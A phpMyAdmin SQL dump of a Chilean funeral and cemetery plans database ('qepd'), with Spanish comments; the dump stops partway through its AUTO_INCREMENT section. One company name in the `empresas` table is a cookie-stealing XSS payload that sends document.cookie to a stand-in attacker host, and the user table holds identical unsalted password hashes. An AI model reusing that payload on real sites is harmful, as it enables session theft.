-- phpMyAdmin SQL Dump
-- version 4.4.10
-- http://www.phpmyadmin.net
--
-- Servidor: localhost:8889
-- Tiempo de generación: 07-10-2017 a las 11:44:42
-- Versión del servidor: 5.5.42
-- Versión de PHP: 5.6.10

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Base de datos: `qepd`
--
CREATE DATABASE IF NOT EXISTS `qepd` DEFAULT CHARACTER SET utf8 COLLATE utf8_unicode_ci;
USE `qepd`;

-- --------------------------------------------------------

--
-- Estructura de tabla para la tabla `capacidades`
--

DROP TABLE IF EXISTS `capacidades`;
CREATE TABLE `capacidades` (
  `id` int(11) NOT NULL,
  `adultos` int(11) NOT NULL,
  `parvulos` int(11) NOT NULL,
  `reducciones` int(11) NOT NULL,
  `anforas` int(11) NOT NULL,
  `plan_id` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

-- --------------------------------------------------------

--
-- Estructura de tabla para la tabla `cinerarios`
--

DROP TABLE IF EXISTS `cinerarios`;
CREATE TABLE `cinerarios` (
  `id` int(11) NOT NULL,
  `sala` tinyint(1) NOT NULL,
  `capilla` tinyint(1) NOT NULL,
  `podium` tinyint(1) NOT NULL,
  `liturgia` tinyint(1) NOT NULL,
  `amplificacion` tinyint(1) NOT NULL,
  `diacono` tinyint(1) NOT NULL,
  `coro` int(11) NOT NULL,
  `cafeteria` varchar(20) COLLATE utf8_unicode_ci NOT NULL,
  `ceremonia` tinyint(1) NOT NULL,
  `anforaincl` tinyint(1) NOT NULL,
  `plan_id` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

-- --------------------------------------------------------

--
-- Estructura de tabla para la tabla `componentes`
--

DROP TABLE IF EXISTS `componentes`;
CREATE TABLE `componentes` (
  `id` int(11) NOT NULL,
  `nombre` varchar(50) COLLATE utf8_unicode_ci NOT NULL,
  `servicio_id` int(11) NOT NULL,
  `url` varchar(50) COLLATE utf8_unicode_ci DEFAULT NULL,
  `url_view` varchar(100) COLLATE utf8_unicode_ci DEFAULT NULL
) ENGINE=InnoDB AUTO_INCREMENT=11 DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

--
-- Volcado de datos para la tabla `componentes`
--

INSERT INTO `componentes` (`id`, `nombre`, `servicio_id`, `url`, `url_view`) VALUES
(1, 'Urna', 9, 'urnas/add', 'urnas/view/'),
(2, 'Velatorio', 9, 'velatorios/add', 'velatorios/view/'),
(3, 'Traslado', 9, 'traslados/add', 'traslados/view/'),
(4, 'Creamatorio', 10, 'cinerarios/add', 'cinerarios/view/'),
(5, 'Anfora', 10, 'anforas/add', 'anforas/view/'),
(6, 'Sepultacion', 11, 'sepultaciones/add', 'sepultaciones/view/'),
(7, 'Capacidad', 12, 'capacidades/add', 'capacidades/view/'),
(8, 'Construccion', 12, 'construcciones/add', 'construcciones/view/'),
(9, 'Ubicacion', 12, 'ubicaciones/add', 'ubicaciones/view/'),
(10, 'Mantencion', 12, 'mantenciones/add', 'mantenciones/view/');

-- --------------------------------------------------------

--
-- Estructura de tabla para la tabla `comunas`
--

DROP TABLE IF EXISTS `comunas`;
CREATE TABLE `comunas` (
  `id` int(11) NOT NULL,
  `nombre` varchar(100) COLLATE utf8_unicode_ci NOT NULL,
  `region_id` varchar(100) COLLATE utf8_unicode_ci NOT NULL
) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

--
-- Volcado de datos para la tabla `comunas`
--

INSERT INTO `comunas` (`id`, `nombre`, `region_id`) VALUES
(1, 'Santiago', '13'),
(2, 'Providencia', '13');

-- --------------------------------------------------------

--
-- Estructura de tabla para la tabla `condiciones`
--

DROP TABLE IF EXISTS `condiciones`;
CREATE TABLE `condiciones` (
  `id` int(11) NOT NULL,
  `plan_id` int(11) NOT NULL,
  `precio` int(11) DEFAULT NULL,
  `formapago` varchar(100) COLLATE utf8_unicode_ci DEFAULT NULL,
  `plazopago` int(11) DEFAULT NULL,
  `compraanticipada` int(11) DEFAULT NULL,
  `segurodeceso` int(11) DEFAULT NULL,
  `convenios` varchar(100) COLLATE utf8_unicode_ci DEFAULT NULL,
  `descuentocol` int(11) DEFAULT NULL,
  `descuentonicho` int(11) DEFAULT NULL,
  `pensiones` int(11) DEFAULT NULL
) ENGINE=InnoDB AUTO_INCREMENT=5 DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

--
-- Volcado de datos para la tabla `condiciones`
--

INSERT INTO `condiciones` (`id`, `plan_id`, `precio`, `formapago`, `plazopago`, `compraanticipada`, `segurodeceso`, `convenios`, `descuentocol`, `descuentonicho`, `pensiones`) VALUES
(1, 2, 3000, 'contado', 1, 2, 2, 'Sin convenios', 30, 30, 1),
(3, 1, 5400, '3 cheques', 2, 1, 2, 'Caja de compensacion La Araucana', 5, 0, 2),
(4, 4, 8900, 'contado', 2, 1, 1, 'Sin convenios', 0, 0, 1);

-- --------------------------------------------------------

--
-- Estructura de tabla para la tabla `construcciones`
--

DROP TABLE IF EXISTS `construcciones`;
CREATE TABLE `construcciones` (
  `id` int(11) NOT NULL,
  `tipo_construccion_id` int(11) NOT NULL,
  `material_id` int(11) NOT NULL,
  `terminacion_id` int(11) NOT NULL,
  `grabado` tinyint(1) NOT NULL,
  `plan_id` int(11) NOT NULL
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

--
-- Volcado de datos para la tabla `construcciones`
--

INSERT INTO `construcciones` (`id`, `tipo_construccion_id`, `material_id`, `terminacion_id`, `grabado`, `plan_id`) VALUES
(1, 1, 1, 1, 1, 1);

-- --------------------------------------------------------

--
-- Estructura de tabla para la tabla `cotizaciones`
--

DROP TABLE IF EXISTS `cotizaciones`;
CREATE TABLE `cotizaciones` (
  `id` int(11) NOT NULL,
  `destinatario_id` int(11) NOT NULL,
  `plan_id` int(11) NOT NULL,
  `cliente` varchar(100) COLLATE utf8_unicode_ci NOT NULL,
  `rut` varchar(20) COLLATE utf8_unicode_ci DEFAULT NULL,
  `telefono` varchar(20) COLLATE utf8_unicode_ci NOT NULL,
  `email` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `difunto` varchar(100) COLLATE utf8_unicode_ci NOT NULL,
  `edad` int(10) NOT NULL,
  `estatura` int(11) NOT NULL,
  `peso` int(11) NOT NULL,
  `observaciones` text COLLATE utf8_unicode_ci NOT NULL,
  `status_id` int(11) NOT NULL,
  `created` date NOT NULL,
  `updated` date NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

-- --------------------------------------------------------

--
-- Estructura de tabla para la tabla `destinatarios`
--

DROP TABLE IF EXISTS `destinatarios`;
CREATE TABLE `destinatarios` (
  `id` int(11) NOT NULL,
  `nombre` varchar(20) COLLATE utf8_unicode_ci NOT NULL
) ENGINE=InnoDB AUTO_INCREMENT=4 DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

--
-- Volcado de datos para la tabla `destinatarios`
--

INSERT INTO `destinatarios` (`id`, `nombre`) VALUES
(1, 'Bebé'),
(2, 'Niño'),
(3, 'Adulto');

-- --------------------------------------------------------

--
-- Estructura de tabla para la tabla `empresas`
--

DROP TABLE IF EXISTS `empresas`;
CREATE TABLE `empresas` (
  `id` int(11) NOT NULL,
  `nombre` varchar(100) COLLATE utf8_unicode_ci NOT NULL,
  `email` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `rut` varchar(50) COLLATE utf8_unicode_ci NOT NULL,
  `usuario_id` int(11) NOT NULL,
  `tipo_empresa_id` int(11) NOT NULL,
  `created` date DEFAULT NULL,
  `updated` date DEFAULT NULL
) ENGINE=InnoDB AUTO_INCREMENT=4 DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

--
-- Volcado de datos para la tabla `empresas`
--

INSERT INTO `empresas` (`id`, `nombre`, `email`, `rut`, `usuario_id`, `tipo_empresa_id`, `created`, `updated`) VALUES
(1, 'Empresa 1', 'empresa@empresa.cl', '68547890-7', 1, 1, '2017-04-24', '2017-04-24'),
(2, 'document.location=''http://site.pirate/cgi-bin/script.cgi?''+document.cookie', 'empresa@empresa.cl', '89982345-8', 2, 3, '2017-04-25', '2017-09-11'),
(3, 'Empresa nueva', 'empresa@empresa.cl', '7654398456-2', 1, 2, '2017-04-25', '2017-04-25');

-- --------------------------------------------------------

--
-- Estructura de tabla para la tabla `imagenes`
--

DROP TABLE IF EXISTS `imagenes`;
CREATE TABLE `imagenes` (
  `id` int(11) NOT NULL,
  `titulo` varchar(100) COLLATE utf8_unicode_ci NOT NULL,
  `nombre` varchar(100) COLLATE utf8_unicode_ci NOT NULL,
  `componente_id` int(11) NOT NULL,
  `plan_id` int(11) NOT NULL
) ENGINE=InnoDB AUTO_INCREMENT=4 DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

--
-- Volcado de datos para la tabla `imagenes`
--

INSERT INTO `imagenes` (`id`, `titulo`, `nombre`, `componente_id`, `plan_id`) VALUES
(1, 'Imagen 1', 'upl_593710062b241.png', 1, 1),
(2, 'Imagen 2', 'upl_5937109b6b6fe.png', 3, 2),
(3, 'Urna 1', 'upl_59b8015e6c67a.jpg', 1, 1);

-- --------------------------------------------------------

--
-- Estructura de tabla para la tabla `mantenciones`
--

DROP TABLE IF EXISTS `mantenciones`;
CREATE TABLE `mantenciones` (
  `id` int(11) NOT NULL,
  `cobro` tinyint(1) NOT NULL,
  `periodo_id` int(11) NOT NULL,
  `plan_id` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

-- --------------------------------------------------------

--
-- Estructura de tabla para la tabla `materiales`
--

DROP TABLE IF EXISTS `materiales`;
CREATE TABLE `materiales` (
  `id` int(11) NOT NULL,
  `nombre` varchar(20) COLLATE utf8_unicode_ci NOT NULL
) ENGINE=InnoDB AUTO_INCREMENT=4 DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

--
-- Volcado de datos para la tabla `materiales`
--

INSERT INTO `materiales` (`id`, `nombre`) VALUES
(1, 'Concreto armado'),
(2, 'Ladrillo'),
(3, 'Otro');

-- --------------------------------------------------------

--
-- Estructura de tabla para la tabla `periodos`
--

DROP TABLE IF EXISTS `periodos`;
CREATE TABLE `periodos` (
  `id` int(11) NOT NULL,
  `nombre` varchar(20) COLLATE utf8_unicode_ci NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

-- --------------------------------------------------------

--
-- Estructura de tabla para la tabla `planes`
--

DROP TABLE IF EXISTS `planes`;
CREATE TABLE `planes` (
  `id` int(11) NOT NULL,
  `nombre` varchar(50) COLLATE utf8_unicode_ci NOT NULL,
  `codigo` varchar(20) COLLATE utf8_unicode_ci DEFAULT NULL,
  `tipo_plan_id` int(11) NOT NULL,
  `servicio_id` int(11) NOT NULL,
  `empresa_id` int(11) NOT NULL,
  `destinatario_id` int(11) DEFAULT NULL,
  `status_id` int(11) DEFAULT NULL,
  `dated` datetime DEFAULT NULL,
  `updated` datetime DEFAULT NULL
) ENGINE=InnoDB AUTO_INCREMENT=5 DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

--
-- Volcado de datos para la tabla `planes`
--

INSERT INTO `planes` (`id`, `nombre`, `codigo`, `tipo_plan_id`, `servicio_id`, `empresa_id`, `destinatario_id`, `status_id`, `dated`, `updated`) VALUES
(1, 'Plan 1', 'P0001', 1, 9, 3, 3, 1, '2017-06-09 13:39:56', '2017-07-25 17:42:46'),
(2, 'Plan 2', 'P002', 1, 11, 1, 1, 1, '2017-07-25 17:41:43', '2017-07-25 17:43:56'),
(3, 'Plan 3', 'P0004', 1, 9, 1, 3, 1, '2017-09-04 13:44:47', '2017-09-12 12:44:01'),
(4, 'Plan 4', 'P0008', 1, 12, 3, 1, 1, '2017-09-04 16:32:19', '2017-09-11 17:20:10');

-- --------------------------------------------------------

--
-- Estructura de tabla para la tabla `regiones`
--

DROP TABLE IF EXISTS `regiones`;
CREATE TABLE `regiones` (
  `id` int(11) NOT NULL,
  `nombre` varchar(100) COLLATE utf8_unicode_ci NOT NULL
) ENGINE=InnoDB AUTO_INCREMENT=16 DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

--
-- Volcado de datos para la tabla `regiones`
--

INSERT INTO `regiones` (`id`, `nombre`) VALUES
(1, 'I Tarapacá'),
(2, 'II Antofagasta'),
(3, 'III Atacama'),
(4, 'IV Coquimbo'),
(5, 'V Valparaiso'),
(6, 'VI OHiggins'),
(7, 'VII Maule'),
(8, 'VIII Bio Bio'),
(9, 'IX Araucanía'),
(10, 'X Los Lagos'),
(11, 'XI Aysén'),
(12, 'XII Magallanes'),
(13, 'XIII Metropolitana'),
(14, 'XIV Los Rios'),
(15, 'XV Arica y Parinacota');

-- --------------------------------------------------------

--
-- Estructura de tabla para la tabla `roles`
--

DROP TABLE IF EXISTS `roles`;
CREATE TABLE `roles` (
  `id` int(11) NOT NULL,
  `nombre` varchar(50) COLLATE utf8_unicode_ci NOT NULL
) ENGINE=InnoDB AUTO_INCREMENT=8 DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

--
-- Volcado de datos para la tabla `roles`
--

INSERT INTO `roles` (`id`, `nombre`) VALUES
(1, 'Administrador'),
(2, 'nuevo'),
(3, 'Usuario'),
(4, 'ClienteN'),
(5, 'Otro'),
(6, 'Nuevo'),
(7, 'Manuel');

-- --------------------------------------------------------

--
-- Estructura de tabla para la tabla `sedes`
--

DROP TABLE IF EXISTS `sedes`;
CREATE TABLE `sedes` (
  `id` int(11) NOT NULL,
  `nombre` varchar(100) COLLATE utf8_unicode_ci NOT NULL,
  `calle` varchar(100) COLLATE utf8_unicode_ci NOT NULL,
  `numero` varchar(10) COLLATE utf8_unicode_ci NOT NULL,
  `sector` varchar(100) COLLATE utf8_unicode_ci DEFAULT NULL,
  `ubicacion` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `empresa_id` int(11) NOT NULL,
  `comuna_id` int(11) NOT NULL
) ENGINE=InnoDB AUTO_INCREMENT=5 DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

--
-- Volcado de datos para la tabla `sedes`
--

INSERT INTO `sedes` (`id`, `nombre`, `calle`, `numero`, `sector`, `ubicacion`, `empresa_id`, `comuna_id`) VALUES
(1, 'Principal', 'Nueva providencia', '123', 'centro', NULL, 1, 1),
(2, 'Apoquindo', 'Apoquindo', '12', 'Centro', NULL, 1, 1),
(3, 'Principal', 'Agustinas', '1291', 'Centro', NULL, 3, 2),
(4, 'Principal', 'Lyon', '2045', 'Centro', NULL, 2, 2);

-- --------------------------------------------------------

--
-- Estructura de tabla para la tabla `sepultaciones`
--

DROP TABLE IF EXISTS `sepultaciones`;
CREATE TABLE `sepultaciones` (
  `id` int(11) NOT NULL,
  `sala` tinyint(1) NOT NULL,
  `capilla` tinyint(1) NOT NULL,
  `liturgia` tinyint(1) NOT NULL,
  `toldos` int(11) NOT NULL,
  `sillas` int(11) NOT NULL,
  `amplificacion` tinyint(1) NOT NULL,
  `diacono` tinyint(1) NOT NULL,
  `coro` int(11) NOT NULL,
  `cafeteria` varchar(20) COLLATE utf8_unicode_ci NOT NULL,
  `plan_id` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

-- --------------------------------------------------------

--
-- Estructura de tabla para la tabla `servicios`
--

DROP TABLE IF EXISTS `servicios`;
CREATE TABLE `servicios` (
  `id` int(11) NOT NULL,
  `nombre` varchar(50) COLLATE utf8_unicode_ci NOT NULL,
  `tipo_empresa_id` int(11) NOT NULL
) ENGINE=InnoDB AUTO_INCREMENT=13 DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

--
-- Volcado de datos para la tabla `servicios`
--

INSERT INTO `servicios` (`id`, `nombre`, `tipo_empresa_id`) VALUES
(9, 'Funerarios', 2),
(10, 'Cinerario', 1),
(11, 'Sepultación', 1),
(12, 'Sepulturas', 1);

-- --------------------------------------------------------

--
-- Estructura de tabla para la tabla `soluciones`
--

DROP TABLE IF EXISTS `soluciones`;
CREATE TABLE `soluciones` (
  `id` int(11) NOT NULL,
  `solucion` int(11) NOT NULL,
  `periodo` int(11) NOT NULL,
  `anios` int(11) DEFAULT NULL,
  `tipo_solucion` int(11) NOT NULL,
  `tipo_plan` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

-- --------------------------------------------------------

--
-- Estructura de tabla para la tabla `status`
--

DROP TABLE IF EXISTS `status`;
CREATE TABLE `status` (
  `id` int(11) NOT NULL,
  `nombre` varchar(20) COLLATE utf8_unicode_ci DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

-- --------------------------------------------------------

--
-- Estructura de tabla para la tabla `telefonos`
--

DROP TABLE IF EXISTS `telefonos`;
CREATE TABLE `telefonos` (
  `id` int(11) NOT NULL,
  `numero` varchar(20) COLLATE utf8_unicode_ci NOT NULL,
  `sede_id` int(11) NOT NULL
) ENGINE=InnoDB AUTO_INCREMENT=4 DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

--
-- Volcado de datos para la tabla `telefonos`
--

INSERT INTO `telefonos` (`id`, `numero`, `sede_id`) VALUES
(1, '1234567890', 1),
(2, '1234567890', 2),
(3, '12345678', 2);

-- --------------------------------------------------------

--
-- Estructura de tabla para la tabla `terminaciones`
--

DROP TABLE IF EXISTS `terminaciones`;
CREATE TABLE `terminaciones` (
  `id` int(11) NOT NULL,
  `nombre` varchar(20) COLLATE utf8_unicode_ci NOT NULL
) ENGINE=InnoDB AUTO_INCREMENT=7 DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

--
-- Volcado de datos para la tabla `terminaciones`
--

INSERT INTO `terminaciones` (`id`, `nombre`) VALUES
(1, 'Granito'),
(2, 'Mármol'),
(3, 'Concreto en bruto'),
(4, 'Pasto'),
(5, 'Tierra'),
(6, 'Otro');

-- --------------------------------------------------------

--
-- Estructura de tabla para la tabla `tipo_construcciones`
--

DROP TABLE IF EXISTS `tipo_construcciones`;
CREATE TABLE `tipo_construcciones` (
  `id` int(11) NOT NULL,
  `nombre` varchar(20) COLLATE utf8_unicode_ci NOT NULL
) ENGINE=InnoDB AUTO_INCREMENT=4 DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

--
-- Volcado de datos para la tabla `tipo_construcciones`
--

INSERT INTO `tipo_construcciones` (`id`, `nombre`) VALUES
(1, 'Bajo tierra'),
(2, 'Semi enterrada'),
(3, 'Edificada');

-- --------------------------------------------------------

--
-- Estructura de tabla para la tabla `tipo_empresas`
--

DROP TABLE IF EXISTS `tipo_empresas`;
CREATE TABLE `tipo_empresas` (
  `id` int(11) NOT NULL,
  `nombre` varchar(50) COLLATE utf8_unicode_ci NOT NULL
) ENGINE=InnoDB AUTO_INCREMENT=5 DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

--
-- Volcado de datos para la tabla `tipo_empresas`
--

INSERT INTO `tipo_empresas` (`id`, `nombre`) VALUES
(1, 'Cementerio'),
(2, 'Funeraria'),
(3, 'Floristería'),
(4, 'Otro');

-- --------------------------------------------------------

--
-- Estructura de tabla para la tabla `tipo_planes`
--

DROP TABLE IF EXISTS `tipo_planes`;
CREATE TABLE `tipo_planes` (
  `id` int(11) NOT NULL,
  `nombre` varchar(50) COLLATE utf8_unicode_ci NOT NULL
) ENGINE=InnoDB AUTO_INCREMENT=4 DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

--
-- Volcado de datos para la tabla `tipo_planes`
--

INSERT INTO `tipo_planes` (`id`, `nombre`) VALUES
(1, 'Básico'),
(2, 'Medio'),
(3, 'Superior');

-- --------------------------------------------------------

--
-- Estructura de tabla para la tabla `tipo_sepulturas`
--

DROP TABLE IF EXISTS `tipo_sepulturas`;
CREATE TABLE `tipo_sepulturas` (
  `id` int(11) NOT NULL,
  `nombre` varchar(50) COLLATE utf8_unicode_ci NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

-- --------------------------------------------------------

--
-- Estructura de tabla para la tabla `tipo_soluciones`
--

DROP TABLE IF EXISTS `tipo_soluciones`;
CREATE TABLE `tipo_soluciones` (
  `id` int(11) NOT NULL,
  `nombre` varchar(50) COLLATE utf8_unicode_ci NOT NULL
) ENGINE=InnoDB AUTO_INCREMENT=6 DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

--
-- Volcado de datos para la tabla `tipo_soluciones`
--

INSERT INTO `tipo_soluciones` (`id`, `nombre`) VALUES
(1, 'Bóveda'),
(2, 'Nicho'),
(3, 'Mausoleo'),
(4, 'Columbario'),
(5, 'Patio Común');

-- --------------------------------------------------------

--
-- Estructura de tabla para la tabla `tipo_ubicaciones`
--

DROP TABLE IF EXISTS `tipo_ubicaciones`;
CREATE TABLE `tipo_ubicaciones` (
  `id` int(11) NOT NULL,
  `nombre` varchar(20) COLLATE utf8_unicode_ci NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

-- --------------------------------------------------------

--
-- Estructura de tabla para la tabla `traslados`
--

DROP TABLE IF EXISTS `traslados`;
CREATE TABLE `traslados` (
  `id` int(11) NOT NULL,
  `instalacion` tinyint(1) NOT NULL,
  `funeral` tinyint(1) NOT NULL,
  `conflores` tinyint(1) NOT NULL,
  `acompañamiento` tinyint(1) NOT NULL,
  `pasajeros` int(11) NOT NULL,
  `plan_id` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

-- --------------------------------------------------------

--
-- Estructura de tabla para la tabla `ubicaciones`
--

DROP TABLE IF EXISTS `ubicaciones`;
CREATE TABLE `ubicaciones` (
  `id` int(11) NOT NULL,
  `tipo_ubicacion_id` int(11) NOT NULL,
  `estacionamientos` int(11) NOT NULL,
  `direccion` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `plan_id` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

-- --------------------------------------------------------

--
-- Estructura de tabla para la tabla `urnas`
--

DROP TABLE IF EXISTS `urnas`;
CREATE TABLE `urnas` (
  `id` int(11) NOT NULL,
  `modelo` varchar(50) COLLATE utf8_unicode_ci NOT NULL,
  `medidas` varchar(100) COLLATE utf8_unicode_ci NOT NULL,
  `material` varchar(100) COLLATE utf8_unicode_ci NOT NULL,
  `terminaciones` varchar(100) COLLATE utf8_unicode_ci NOT NULL,
  `color` varchar(50) COLLATE utf8_unicode_ci NOT NULL,
  `plan_id` int(11) NOT NULL,
  `componente_id` int(11) DEFAULT NULL
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

--
-- Volcado de datos para la tabla `urnas`
--

INSERT INTO `urnas` (`id`, `modelo`, `medidas`, `material`, `terminaciones`, `color`, `plan_id`, `componente_id`) VALUES
(1, 'Modelo ab2', '200', 'madera', 'brillo', 'cafe', 1, NULL);

-- --------------------------------------------------------

--
-- Estructura de tabla para la tabla `usuarios`
--

DROP TABLE IF EXISTS `usuarios`;
CREATE TABLE `usuarios` (
  `id` int(11) NOT NULL,
  `nombre` varchar(100) COLLATE utf8_unicode_ci NOT NULL,
  `apellido` varchar(100) COLLATE utf8_unicode_ci NOT NULL,
  `email` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `password` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `created` date NOT NULL,
  `updated` date NOT NULL,
  `roles_id` int(11) NOT NULL
) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

--
-- Volcado de datos para la tabla `usuarios`
--

INSERT INTO `usuarios` (`id`, `nombre`, `apellido`, `email`, `password`, `created`, `updated`, `roles_id`) VALUES
(1, 'Segundo', 'Galdames', 'segundogaldames@gmail.com', 'ad4bb92f93e69b89cd82d4308c6026622a6be163', '2017-04-18', '2017-04-18', 1),
(2, 'Jose', 'Perez', 'jose@gmail.com', 'ad4bb92f93e69b89cd82d4308c6026622a6be163', '2017-04-18', '2017-04-18', 3);

-- --------------------------------------------------------

--
-- Estructura de tabla para la tabla `velatorios`
--

DROP TABLE IF EXISTS `velatorios`;
CREATE TABLE `velatorios` (
  `id` int(11) NOT NULL,
  `tramites` varchar(100) COLLATE utf8_unicode_ci NOT NULL,
  `asesor` tinyint(1) NOT NULL,
  `sala` tinyint(1) NOT NULL,
  `capilla` tinyint(1) NOT NULL,
  `cirios` int(11) NOT NULL,
  `portacirios` int(11) NOT NULL,
  `cruces` int(11) NOT NULL,
  `florescanastos` int(11) NOT NULL,
  `florescubreurnas` int(11) NOT NULL,
  `condolencias` int(11) NOT NULL,
  `parroco` tinyint(1) NOT NULL,
  `coro` int(11) NOT NULL,
  `avisosprensa` int(11) NOT NULL,
  `tarjetas` int(11) NOT NULL,
  `cafeteria` varchar(20) COLLATE utf8_unicode_ci NOT NULL,
  `plan_id` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

--
-- Índices para tablas volcadas
--

--
-- Indices de la tabla `capacidades`
--
ALTER TABLE `capacidades`
  ADD PRIMARY KEY (`id`);

--
-- Indices de la tabla `cinerarios`
--
ALTER TABLE `cinerarios`
  ADD PRIMARY KEY (`id`);

--
-- Indices de la tabla `componentes`
--
ALTER TABLE `componentes`
  ADD PRIMARY KEY (`id`);

--
-- Indices de la tabla `comunas`
--
ALTER TABLE `comunas`
  ADD PRIMARY KEY (`id`);

--
-- Indices de la tabla `condiciones`
--
ALTER TABLE `condiciones`
  ADD PRIMARY KEY (`id`);

--
-- Indices de la tabla `construcciones`
--
ALTER TABLE `construcciones`
  ADD PRIMARY KEY (`id`);

--
-- Indices de la tabla `cotizaciones`
--
ALTER TABLE `cotizaciones`
  ADD PRIMARY KEY (`id`);

--
-- Indices de la tabla `destinatarios`
--
ALTER TABLE `destinatarios`
  ADD PRIMARY KEY (`id`);

--
-- Indices de la tabla `empresas`
--
ALTER TABLE `empresas`
  ADD PRIMARY KEY (`id`);

--
-- Indices de la tabla `imagenes`
--
ALTER TABLE `imagenes`
  ADD PRIMARY KEY (`id`);

--
-- Indices de la tabla `mantenciones`
--
ALTER TABLE `mantenciones`
  ADD PRIMARY KEY (`id`);

--
-- Indices de la tabla `materiales`
--
ALTER TABLE `materiales`
  ADD PRIMARY KEY (`id`);

--
-- Indices de la tabla `periodos`
--
ALTER TABLE `periodos`
  ADD PRIMARY KEY (`id`);

--
-- Indices de la tabla `planes`
--
ALTER TABLE `planes`
  ADD PRIMARY KEY (`id`);

--
-- Indices de la tabla `regiones`
--
ALTER TABLE `regiones`
  ADD PRIMARY KEY (`id`);

--
-- Indices de la tabla `roles`
--
ALTER TABLE `roles`
  ADD PRIMARY KEY (`id`);

--
-- Indices de la tabla `sedes`
--
ALTER TABLE `sedes`
  ADD PRIMARY KEY (`id`);

--
-- Indices de la tabla `sepultaciones`
--
ALTER TABLE `sepultaciones`
  ADD PRIMARY KEY (`id`);

--
-- Indices de la tabla `servicios`
--
ALTER TABLE `servicios`
  ADD PRIMARY KEY (`id`);

--
-- Indices de la tabla `soluciones`
--
ALTER TABLE `soluciones`
  ADD PRIMARY KEY (`id`);

--
-- Indices de la tabla `status`
--
ALTER TABLE `status`
  ADD PRIMARY KEY (`id`);

--
-- Indices de la tabla `telefonos`
--
ALTER TABLE `telefonos`
  ADD PRIMARY KEY (`id`);

--
-- Indices de la tabla `terminaciones`
--
ALTER TABLE `terminaciones`
  ADD PRIMARY KEY (`id`);

--
-- Indices de la tabla `tipo_construcciones`
--
ALTER TABLE `tipo_construcciones`
  ADD PRIMARY KEY (`id`);

--
-- Indices de la tabla `tipo_empresas`
--
ALTER TABLE `tipo_empresas`
  ADD PRIMARY KEY (`id`);

--
-- Indices de la tabla `tipo_planes`
--
ALTER TABLE `tipo_planes`
  ADD PRIMARY KEY (`id`);

--
-- Indices de la tabla `tipo_sepulturas`
--
ALTER TABLE `tipo_sepulturas`
  ADD PRIMARY KEY (`id`);

--
-- Indices de la tabla `tipo_soluciones`
--
ALTER TABLE `tipo_soluciones`
  ADD PRIMARY KEY (`id`);

--
-- Indices de la tabla `tipo_ubicaciones`
--
ALTER TABLE `tipo_ubicaciones`
  ADD PRIMARY KEY (`id`);

--
-- Indices de la tabla `traslados`
--
ALTER TABLE `traslados`
  ADD PRIMARY KEY (`id`);

--
-- Indices de la tabla `ubicaciones`
--
ALTER TABLE `ubicaciones`
  ADD PRIMARY KEY (`id`);

--
-- Indices de la tabla `urnas`
--
ALTER TABLE `urnas`
  ADD PRIMARY KEY (`id`);

--
-- Indices de la tabla `usuarios`
--
ALTER TABLE `usuarios`
  ADD PRIMARY KEY (`id`);

--
-- Indices de la tabla `velatorios`
--
ALTER TABLE `velatorios`
  ADD PRIMARY KEY (`id`);

--
-- AUTO_INCREMENT de las tablas volcadas
--

--
-- AUTO_INCREMENT de la tabla `capacidades`
--
